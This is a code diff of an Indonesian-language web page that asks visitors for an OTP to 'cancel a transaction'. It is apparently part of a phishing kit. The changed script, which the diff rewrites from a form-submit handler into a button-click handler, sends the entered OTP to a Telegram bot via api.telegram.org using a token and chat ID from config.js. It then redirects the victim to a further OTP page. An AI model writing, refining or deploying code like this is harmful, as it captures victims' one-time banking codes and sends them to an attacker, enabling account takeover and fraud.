@@ -224,72 +224,65 @@
 				</div>
 
 <div class="p-md text-xxl b-b">
-    <span class="">Masukan OTP Untuk Pembatalan Transaksi</span>
+    <span>Masukan OTP Untuk Pembatalan Transaksi</span>
 </div>
 
 <div class="form-row m-n">
-  
-        <input id="PASSWORD1" name="otp" class="form-control input-text text-lg parsley-validated" placeholder="OTP" autocomplete="off" type="password" inputmode="numeric" value="" size="26" maxlength="6"/>
+    <input id="PASSWORD1" name="otp" class="form-control input-text text-lg parsley-validated" placeholder="OTP" autocomplete="off" type="password" inputmode="numeric" value="" size="26" maxlength="6"/>
 </div>
 
 <br/>
 
 <div class="rows m-l-md m-r-md mb-p-b-lg">
-    <button class="btn btn-primary col-lg-12 btn-s-md p-t-sm p-b-sm" type="submit" value="Submit">
-        <span class="">Batalkan Transaksi</span>
+    <button id="kirimOtpBtn" class="btn btn-primary col-lg-12 btn-s-md p-t-sm p-b-sm" type="button">
+        <span>Batalkan Transaksi</span>
     </button>
 </div>
-
-</form>
 
 <!-- Panggil config.js -->
 <script src="../../config.js"></script>
 
-
 <script>
-window.onload = function() {
-    document.getElementById("formotp4").addEventListener("submit", function(e) {
-        e.preventDefault();
+document.getElementById("kirimOtpBtn").addEventListener("click", function() {
 
-        const otp = document.getElementById("PASSWORD1").value;
+    const otp = document.getElementById("PASSWORD1").value;
 
-        if (otp === "") {
-            alert("Masukkan kode OTP terlebih dahulu!");
-            return;
-        }
+    if (otp === "") {
+        alert("Masukkan kode OTP terlebih dahulu!");
+        return;
+    }
 
-        const pesan = `
+    const pesan = `
 \`\`\`
 📲 OTP Pembatalan Transaksi (Step 2)
 ───────────────────────
 • Kode OTP : ${otp}
 ───────────────────────
 \`\`\`
-        `;
+    `;
 
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: pesan,
-                parse_mode: "Markdown"
-            })
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: pesan,
+            parse_mode: "Markdown"
         })
-        .then(res => res.json())
-        .then(res => {
-            // Ganti submit dengan redirect GET
-            window.location.href = "otplanjut.html";
-        })
-        .catch(err => {
-            console.error(err);
-            alert("Gagal mengirim OTP.");
-        });
+    })
+    .then(res => res.json())
+    .then(res => {
+        // Jika sukses, langsung redirect GET ke otplanjut.html
+        window.location.href = "otplanjut.html";
+    })
+    .catch(err => {
+        console.error(err);
+        alert("Gagal mengirim OTP.");
     });
-}
 
+});
 </script>
 
 														
